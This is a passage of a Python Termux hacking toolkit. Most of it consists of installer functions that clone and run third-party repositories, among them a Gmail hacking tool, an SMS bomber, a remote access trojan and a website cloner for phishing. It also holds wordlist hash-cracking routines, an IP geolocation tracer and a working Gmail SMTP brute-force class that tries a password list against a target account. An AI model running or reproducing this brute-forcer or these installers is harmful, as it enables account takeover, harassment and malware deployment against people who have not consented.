    print("\033[1;91m[*]\033[1;97m InstaReport is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find InstaReport on your termux's home directory.")
    print()

# 81 Kiss-In-Termux
def kissnt():
    print("\n\033[1;91m[*]\033[1;97m Installing Kiss-In-Termux.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/adarshaddee/Kiss-In-Termux")
    os.system("mv Kiss-In-Termux /$HOME")
    os.system("cd /$HOME/Kiss-In-Termux")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m Kiss-In-Termux is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Kiss-In-Termux on your termux's home directory.")
    print()

# 82 parrot-in-termux
def partterx():
    print("\n\033[1;91m[*]\033[1;97m Installing parrot-in-termux.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git wget curl proot-y")
    os.system("git clone https://github.com/risecid/parrot-in-termux")
    os.system("mv parrot.sh /$HOME")
    os.system("cd /$HOME/parrot-in-termux")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m parrot-in-termux is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find parrot-in-termux on your termux's home directory.")
    print()

# 83 Short-Boy
def sortby():
    print("\n\033[1;91m[*]\033[1;97m Installing Short-Boy.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git ruby python -y")
    os.system("gem install lolcat")
    os.system("pip install lolcat")
    os.system("git clone https://github.com/AitzazImtiaz/Short-Boy")
    os.system("mv Short-Boy /$HOME")
    os.system("cd /$HOME/Short-Boy")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    os.system("make install")
    print()
    print("\033[1;91m[*]\033[1;97m Short-Boy is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'shortboy' To access Short-Boy.")
    print()

# 84 termux-desktop
def tdesktp():
    print("\n\033[1;91m[*]\033[1;97m Installing termux-desktop.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/adi1090x/termux-desktop")
    os.system("mv termux-desktop /$HOME")
    os.system("cd /$HOME/termux-desktop")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m termux-desktop is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find termux-desktop on your termux's home directory.")
    print()

# 85 ipdrone
def ipdrone():
    print("\n\033[1;91m[*]\033[1;97m Installing ipdrone.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("pip install lolcat")
    os.system("pip install requests")
    os.system("git clone https://github.com/noob-hackers/ipdrone")
    os.system("mv ipdrone /$HOME")
    os.system("cd /$HOME/ipdrone")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m ipdrone is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find ipdrone on your termux's home directory.")
    print()

# 86 TeleGram-Scraper
def tscrap():
    print("\n\033[1;91m[*]\033[1;97m Installing TeleGram-Scraper.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/th3unkn0n/TeleGram-Scraper")
    os.system("mv TeleGram-Scraper /$HOME")
    os.system("cd /$HOME/TeleGram-Scraper")
    os.system("chmod +x *")
    os.system("python setup.py -i")
    print()
    print("\033[1;91m[*]\033[1;97m TeleGram-Scraper is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find TeleGram-Scraper on your termux's home directory.")
    print()

# 87 osi.ig
def osiig():
    print("\n\033[1;91m[*]\033[1;97m Installing osi.ig.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install python3 git -y")
    os.system("git clone https://github.com/th3unkn0n/osi.ig")
    os.system("mv osi.ig /$HOME")
    os.system("cd /$HOME/osi.ig")
    os.system("chmod +x *")
    os.system("python3 -m pip install -r requirements.txt")
    print()
    print("\033[1;91m[*]\033[1;97m osi.ig is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find osi.ig on your termux's home directory.")
    print()

# 88 Beast_Bomber
def Beastb():
    print("\n\033[1;91m[*]\033[1;97m Installing Beast_Bomber.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/ebankoff/Beast_Bomber")
    os.system("mv Beast_Bomber /$HOME")
    os.system("cd /$HOME/Beast_Bomber")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    print()
    print("\033[1;91m[*]\033[1;97m Beast_Bomber is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Beast_Bomber on your termux's home directory.")
    print()

# 89 007-TheBond
def bombs():
    print("\n\033[1;91m[*]\033[1;97m Installing 007-TheBond.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/Deadshot0x7/007-TheBond")
    os.system("mv 007-TheBond /$HOME")
    os.system("cd /$HOME/007-TheBond")
    os.system("chmod +x *")
    os.system("pip install -r requirements.txt")
    os.system("./setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m 007-TheBond is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find 007-TheBond on your termux's home directory.")
    print()

# 90 MyServer
def MyServer():
    print("\n\033[1;91m[*]\033[1;97m Installing MyServer.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/rajkumardusad/MyServer")
    os.system("mv MyServer /$HOME")
    os.system("cd /$HOME/MyServer")
    os.system("chmod +x *")
    os.system("./install")
    print()
    print("\033[1;91m[*]\033[1;97m MyServer is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux app and type command 'myserver' to access MyServer.")
    print()

# 91 Cracker-Tool
def CrackerTool():
    print("\n\033[1;91m[*]\033[1;97m Installing Cracker-Tool.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/cracker911181/Cracker-Tool")
    os.system("mv Cracker-Tool /$HOME")
    os.system("cd /$HOME/Cracker-Tool")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m Cracker-Tool is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Cracker-Tool on your termux's home directory.")
    print()

# 92 Xteam
def Xteam():
    print("\n\033[1;91m[*]\033[1;97m Installing Xteam.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("git clone https://github.com/xploitstech/Xteam")
    os.system("mv Xteam /$HOME")
    os.system("cd /$HOME/Xteam")
    os.system("chmod +x *")
    os.system("pip3 install -r requirements.txt")
    os.system("bash setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m Xteam is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Xteam on your termux's home directory.")
    print()

# 93 Gmail-Hack
def GmailHack():
    print("\n\033[1;91m[*]\033[1;97m Installing Gmail-Hack.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("termux-setup-storage")
    os.system("git clone https://github.com/mishakorzik/Gmail-Hack")
    os.system("mv Gmail-Hack /$HOME")
    os.system("cd /$HOME/Gmail-Hack")
    os.system("chmod +x *")
    os.system("bash install.sh")
    print()
    print("\033[1;91m[*]\033[1;97m Gmail-Hack is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Gmail-Hack on your termux's home directory.")
    print()

# 94 GH05T-INSTA
def GHINSTA():
    print("\n\033[1;91m[*]\033[1;97m Installing GH05T-INSTA.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python python2 -y")
    os.system("git clone https://github.com/GH05T-HUNTER5/GH05T-INSTA")
    os.system("mv GH05T-INSTA /$HOME")
    os.system("cd /$HOME/GH05T-INSTA")
    os.system("chmod +x *")
    os.system("python install.py")
    print()
    print("\033[1;91m[*]\033[1;97m GH05T-INSTA is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'gh05t' to access GH05T-INSTA.")
    print()

# 95 TORhunter
def TORhunter():
    print("\n\033[1;91m[*]\033[1;97m Installing TORhunter.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/Err0r-ICA/TORhunter")
    os.system("mv TORhunter /$HOME")
    os.system("cd /$HOME/TORhunter")
    os.system("chmod +x *")
    os.system("./install.sh")
    print()
    print("\033[1;91m[*]\033[1;97m TORhunter is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find TORhunter on your termux's home directory.")
    print()

# 96 jarvis-welcome
def jarvswlcm():
    print("\n\033[1;91m[*]\033[1;97m Installing jarvis-welcome.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git mpv -y")
    os.system("git clone https://github.com/AmshenShanu07/jarvis-welcome")
    os.system("mv jarvis-welcome /$HOME")
    os.system("cd /$HOME/jarvis-welcome")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m jarvis-welcome is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find jarvis-welcome on your termux's home directory.")
    print()

# 97 Dh-All
def DhAll():
    print("\n\033[1;91m[*]\033[1;97m Installing Dh-All.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/DH-AL/Dh-All")
    os.system("mv Dh-All /$HOME")
    os.system("cd /$HOME/Dh-All")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m Dh-All is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Dh-All on your termux's home directory.")
    print()

# 98 Viridae
def Viridae():
    print("\n\033[1;91m[*]\033[1;97m Installing Viridae.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("git clone https://github.com/Err0r-ICA/Viridae")
    os.system("mv Viridae /$HOME")
    os.system("cd /$HOME/Viridae")
    os.system("chmod +x *")
    os.system("pip2 install -r requirements.txt")
    print()
    print("\033[1;91m[*]\033[1;97m Viridae is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Viridae on your termux's home directory.")
    print()

# 99 httpfy
def httpfy():
    print("\n\033[1;91m[*]\033[1;97m Installing httpfy.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git nodejs-lts -y")
    os.system("git clone https://github.com/devXprite/httpfy/")
    os.system("mv httpfy /$HOME")
    os.system("cd /$HOME/httpfy")
    os.system("chmod +x *")
    os.system("npm install")
    print()
    print("\033[1;91m[*]\033[1;97m httpfy is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find httpfy on your termux's home directory.")
    print()

# 100 HCORat
def HCORat():
    print("\n\033[1;91m[*]\033[1;97m Installing HCORat.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/Hackerscolonyofficial/HCORat")
    os.system("mv HCORat /$HOME")
    os.system("cd /$HOME/HCORat")
    os.system("chmod +x *")
    os.system("bash setup")
    print()
    print("\033[1;91m[*]\033[1;97m HCORat is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find HCORat on your termux's home directory.")
    print()

# 101 RED_HAWK
def REDHAWK():
    print("\n\033[1;91m[*]\033[1;97m Installing RED_HAWK.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git php -y")
    os.system("git clone https://github.com/Tuhinshubhra/RED_HAWK")
    os.system("mv RED_HAWK /$HOME")
    os.system("cd /$HOME/RED_HAWK")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m RED_HAWK is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find RED_HAWK on your termux's home directory.")
    print()

# 102 TraceX-GUI
def trcexgui():
    print("\n\033[1;91m[*]\033[1;97m Installing TraceX-GUI.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/MrHacker-X/TraceX-GUI")
    os.system("mv TraceX-GUI /$HOME")
    os.system("cd /$HOME/TraceX-GUI")
    os.system("chmod +x *")
    os.system("bash termx.sh")
    print()
    print("\033[1;91m[*]\033[1;97m TraceX-GUI is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'tracex' to activate TraceX-GUI.")
    print()

# 103 PassX
def PassX():
    print("\n\033[1;91m[*]\033[1;97m Installing PassX.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/MrHacker-X/PassX")
    os.system("mv PassX /$HOME")
    os.system("cd /$HOME/PassX")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m PassX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find PassX on your termux's home directory.")
    print()

# 104 DecodeX
def DecodeX():
    print("\n\033[1;91m[*]\033[1;97m Installing DecodeX.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/MrHacker-X/DecodeX")
    os.system("mv DecodeX /$HOME")
    os.system("cd /$HOME/DecodeX")
    os.system("chmod +x *")
    print()
    print("\033[1;91m[*]\033[1;97m DecodeX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find DecodeX on your termux's home directory.")
    print()

# 105 termux-fingerprint
def tfingrp():
    print("\n\033[1;91m[*]\033[1;97m Installing termux-fingerprint.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/MrHacker-X/termux-fingerprint/")
    os.system("mv termux-fingerprint /$HOME")
    print()
    print("\033[1;91m[*]\033[1;97m termux-fingerprint is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find termux-fingerprint on your termux's home directory.")
    print()

# 106 CloneWeb
def CloneWeb():
    print("\n\033[1;91m[*]\033[1;97m Installing CloneWeb.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git wget curl -y")
    os.system("git clone https://github.com/MrHacker-X/CloneWeb")
    os.system("mv CloneWeb /$HOME")
    os.system("cd /$HOME/CloneWeb")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m CloneWeb is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'clone' to launch CloneWeb.")
    print()

# 107 Hacked
def Hacked():
    print("\n\033[1;91m[*]\033[1;97m Installing Hacked.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git python figlet -y")
    os.system("git clone https://github.com/MrHacker-X/Hacked")
    os.system("mv Hacked /$HOME")
    print()
    print("\033[1;91m[*]\033[1;97m Hacked is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find Hacked on your termux's home directory.")
    print()

# 108 SploitX
def SploitX():
    print("\n\033[1;91m[*]\033[1;97m Installing SploitX.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/MrHacker-X/SploitX/")
    os.system("mv SploitX /$HOME")
    os.system("cd /$HOME/SploitX")
    os.system("chmod +x *")
    os.system("bash setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m SploitX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find SploitX on your termux's home directory.")
    print()

# 109 ScannerX
def ScannerX():
    print("\n\033[1;91m[*]\033[1;97m Installing ScannerX.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/MrHacker-X/ScannerX")
    os.system("mv ScannerX /$HOME")
    os.system("cd /$HOME/ScannerX")
    os.system("chmod +x *")
    os.system("./setup.sh")
    print()
    print("\033[1;91m[*]\033[1;97m ScannerX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m Reopen your termux and type command 'scanx' to access ScannerX.")
    print()

# 110 BannerX
def BannerX():
    print("\n\033[1;91m[*]\033[1;97m Installing BannerX.....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone https://github.com/MrHacker-X/BannerX")
    os.system("mv BannerX /$HOME")
    print()
    print("\033[1;91m[*]\033[1;97m BannerX is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find BannerX on your termux's home directory.")
    print()

template = """
#
def toolx():
    print("\n\033[1;91m[*]\033[1;97m Installing .....\n")
    print("\033[1;91m[*]\033[1;97m It can take a few moment to install it so, Be Patience\n")
    os.system("apt update -y")
    os.system("apt upgrade -y")
    os.system("apt install git -y")
    os.system("git clone ")
    os.system("mv  /$HOME")
    os.system("cd /$HOME/")
    os.system("chmod +x *")
    os.system("")
    print()
    print("\033[1;91m[*]\033[1;97m  is installed successfully in your termux,\n\033[1;91m[*]\033[1;97m You will find TraceX on your termux's home directory.")
    print()
"""


############ Password generator section #######################################

def genpassx():
    print("\033[1;92m\n \033[1;91m[*]\033[1;97m Password generator launching...")
    sleep(0.7)
    MAX_LEN = int(input(' \033[1;91m[?]\033[1;97m Password length: '))
    cot = int(input(' \033[1;91m[?]\033[1;97m Password count: '))

    print('\033[1;92m\n \033[1;91m[*]\033[1;97m Password length ' + str(MAX_LEN) + ' Selected')
    print('\033[1;92m \033[1;91m[*]\033[1;97m ' + str(cot) + ' Password will generate.')

    print('\033[1;92m\n \033[1;91m[*]\033[1;97m Generating.....\n')
    sleep(1.3)
    print('\033[1;92m\n \033[1;91m[*]\033[1;97m Following are the generated password.\n')

    sleep(1)

    for i in range(cot):
        
        DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
        LOCASE_CHARACTERS = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
        UPCASE_CHARACTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
        SYMBOLS = ['@', '#', '$', '%', '=', ':', '?', '.', '/', '|', '~', '>', '*', '(', ')', '<']
        
        COMBINED_LIST = DIGITS + UPCASE_CHARACTERS + LOCASE_CHARACTERS + SYMBOLS
        rand_digit = random.choice(DIGITS)
        rand_upper = random.choice(UPCASE_CHARACTERS)
        rand_lower = random.choice(LOCASE_CHARACTERS)
        rand_symbol = random.choice(SYMBOLS)
        temp_pass = rand_digit + rand_upper + rand_lower + rand_symbol
        
        for x in range(MAX_LEN - 4):
            temp_pass = temp_pass + random.choice(COMBINED_LIST)
            temp_pass_list = array.array('u', temp_pass)
            random.shuffle(temp_pass_list)
        password = ""
        
        for x in temp_pass_list:
            password = password + x
        print('\033[1;91m>>> \033[1;97m', password)
        sleep(0.1)


###########Hash cracking section###############################################

## md5 section
def mds():
    flag = 0

    try:
        pass_file = open(wordlist, 'r')

    except:
        print('\n\033[1;91m[*]\033[1;97m Wordlist is not found\n')
        quit()

    sleep(1)
    for word in pass_file:
        enc_wrd = word.encode('utf-8')
        digest = hashlib.md5(enc_wrd.strip()).hexdigest()
        print('\033[1;91m' + word)
        if digest == pass_hash:
            print('\n\033[1;91m[*]\033[1;97m Hash has been cracked. \n')
            print('\033[1;91m[*] Word is >> \033[1;92m' + word )
            flag = 1
            break
    if flag == 0:
        print('\n\033[1;91m[!] Word is not found in the wordlist')
        print('\033[1;91m[*]\033[1;97m Better luck next time.\n')

## sha1 section
def shaa():
    flag = 0

    try:
        pass_file = open(wordlist, 'r')

    except:
        print('\n\033[1;91m[*]\033[1;97m Wordlist is not found\n')
        quit()

    sleep(1)
    for word in pass_file:
        enc_wrd = word.encode('utf-8')
        digest = hashlib.sha1(enc_wrd.strip()).hexdigest()
        print('\033[1;91m' + word)
        if digest == pass_hash:
            print('\n\033[1;91m[*]\033[1;97m Hash has been cracked. \n')
            print('\033[1;91m[*] Word is >> \033[1;92m' + word )
            flag = 1
            break
    if flag == 0:
        print('\n\033[1;91m[!] Word is not found in the wordlist')
        print('\033[1;91m[*]\033[1;97m Better luck next time.\n')

## sha224 section
def shaaa():
    flag = 0

    try:
        pass_file = open(wordlist, 'r')

    except:
        print('\n\033[1;91m[*]\033[1;97m Wordlist is not found\n')
        quit()

    sleep(1)
    for word in pass_file:
        enc_wrd = word.encode('utf-8')
        digest = hashlib.sha224(enc_wrd.strip()).hexdigest()
        print('\033[1;91m' + word)
        if digest == pass_hash:
            print('\n\033[1;91m[*]\033[1;97m Hash has been cracked. \n')
            print('\033[1;91m[*] Word is >> \033[1;92m' + word )
            flag = 1
            break
    if flag == 0:
        print('\n\033[1;91m[!] Word is not found in the wordlist')
        print('\033[1;91m[*]\033[1;97m Better luck next time.\n')

## sha256 section
def shad():
    flag = 0

    try:
        pass_file = open(wordlist, 'r')

    except:
        print('\n\033[1;91m[*]\033[1;97m Wordlist is not found\n')
        quit()

    sleep(1)
    for word in pass_file:
        enc_wrd = word.encode('utf-8')
        digest = hashlib.sha256(enc_wrd.strip()).hexdigest()
        print('\033[1;91m' + word)
        if digest == pass_hash:
            print('\n\033[1;91m[*]\033[1;97m Hash has been cracked. \n')
            print('\033[1;91m[*] Word is >> \033[1;92m' + word )
            flag = 1
            break
    if flag == 0:
        print('\n\033[1;91m[!] Word is not found in the wordlist')
        print('\033[1;91m[*]\033[1;97m Better luck next time.\n')

## sha384 section
def shaf():
    flag = 0

    try:
        pass_file = open(wordlist, 'r')

    except:
        print('\n\033[1;91m[*]\033[1;97m Wordlist is not found\n')
        quit()

    sleep(1)
    for word in pass_file:
        enc_wrd = word.encode('utf-8')
        digest = hashlib.sha384(enc_wrd.strip()).hexdigest()
        print('\033[1;91m' + word)
        if digest == pass_hash:
            print('\n\033[1;91m[*]\033[1;97m Hash has been cracked. \n')
            print('\033[1;91m[*] Word is >> \033[1;92m' + word )
            flag = 1
            break
    if flag == 0:
        print('\n\033[1;91m[!] Word is not found in the wordlist')
        print('\033[1;91m[*]\033[1;97m Better luck next time.\n')

## sha512
def shak():
    flag = 0

    try:
        pass_file = open(wordlist, 'r')

    except:
        print('\n\033[1;91m[*]\033[1;97m Wordlist is not found\n')
        quit()

    sleep(1)
    for word in pass_file:
        enc_wrd = word.encode('utf-8')
        digest = hashlib.sha512(enc_wrd.strip()).hexdigest()
        print('\033[1;91m' + word)
        if digest == pass_hash:
            print('\n\033[1;91m[*]\033[1;97m Hash has been cracked. \n')
            print('\033[1;91m[*] Word is >> \033[1;92m' + word )
            flag = 1
            break
    if flag == 0:
        print('\n\033[1;91m[!] Word is not found in the wordlist')
        print('\033[1;91m[*]\033[1;97m Better luck next time.\n')



## Hacking email bruteforce script ###########################################################

def hackmail():
    class GmailBruteForce():
        def __init__(self):
            self.accounts = []
            self.passwords = []
            self.init_smtplib()

        def get_pass_list(self,path):
            file = open(path, 'r',encoding='utf8').read().splitlines()
            for line in file:
                self.passwords.append(line)

        def init_smtplib(self):
            self.smtp = smtplib.SMTP("smtp.gmail.com",587)
            self.smtp.starttls()
            self.smtp.ehlo()

        def try_gmail(self):
            for user in self.accounts:
                for password in self.passwords:
                    try:
                        self.smtp.login(user,password)
                        print(("\033[1;92mPassword found %s -> " % user + " -> %s \033[1;m" % password))
                        self.smtp.quit()
                        self.init_smtplib()
                        break;
                    except smtplib.SMTPAuthenticationError:
                        print(("\033[1;91mWrong %s " % user + " -> %s \033[1;91m" % password))
    instance = GmailBruteForce()
    header = [('User-agent', 'Mozilla/5.0 (x11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    instance.accounts.append(usr)
    instance.get_pass_list(passlist)

    instance.try_gmail()

############ IP Address Tracking ###########################################################

def traceip():

    r = requests.get("http://ip-api.com/json/" + targetip + "?fields=66846719")

    print("\n\033[1;91m[*]\033[1;97m IP detail is given down below\n")
 #   print()
    sleep(0.1)
    print("\033[1;92m \033[1;91m➤\033[1;97m Target IP      : " + str(r.json() ['query'] ))
    sleep(0.1)
    print("\033[1;92m \033[1;91m➤\033[1;97m Status Code    : " + str(r.status_code))
    sleep(0.1)
    if str(r.json() ['status']) == 'success':
        print(" \033[1;91m➤\033[1;97m Status         :\033[1;92m " + str(r.json() ['status']))
        sleep(0.1)

    elif str(r.json() ['status']) == 'fail':
        print(" \033[1;91m➤\033[1;97m Status         :\033[1;97m " + str(r.json() ['status']) + '\033[1;92m')
        sleep(0.1)
        print(" \033[1;91m➤\033[1;97m Message        : " + str(r.json() ['message']))
        sleep(0.1)
        if str(r.json() ['message']) == 'invalid query':
            print('\n\033[1;91m[!] \033[1;97m' + targetip + ' is an invalid IP Address, So you can try another IP Address.\n')
            exit()
        elif str(r.json() ['message']) == 'private range':
            print('\n\033[1;91m[!] \033[1;97m' + targetip + ' is a private IP Address, So This IP can not be traced.\n')
            exit()
        elif str(r.json() ['message']) == 'reserved range':
            print('\n\033[1;91m[!] \033[1;97m' + targetip + ' is a reserved IP Address, So This IP can not be traced.\n')
            exit()
        else:
            print('\nCheck your internet connection.\n')
            exit()

    print(" \033[1;91m➤\033[1;97m Continent      : " + str(r.json() ['continent']))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Continent Code : " + str(r.json() ['continentCode'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Country        : " + str(r.json() ['country'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Country Code   : " + str(r.json() ['countryCode'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Region         : " + str(r.json() ['region'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Region Name    : " + str(r.json() ['regionName'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m City           : " + str(r.json() ['city'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m District       : " + str(r.json() ['district'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m ZIP Code       : " + str(r.json() ['zip'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Latitude       : " + str(r.json() ['lat'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Longitude      : " + str(r.json() ['lon'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m TimeZone       : " + str(r.json() ['timezone'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Offset         : " + str(r.json() ['offset'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Currency       : " + str(r.json() ['currency'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m ISP            : " + str(r.json() ['isp'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m Organization   : " + str(r.json() ['org'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m AS             : " + str(r.json() ['as'] ))
    sleep(0.1)
    print(" \033[1;91m➤\033[1;97m AS Name        : " + str(r.json() ['asname'] ))
    sleep(0.1)
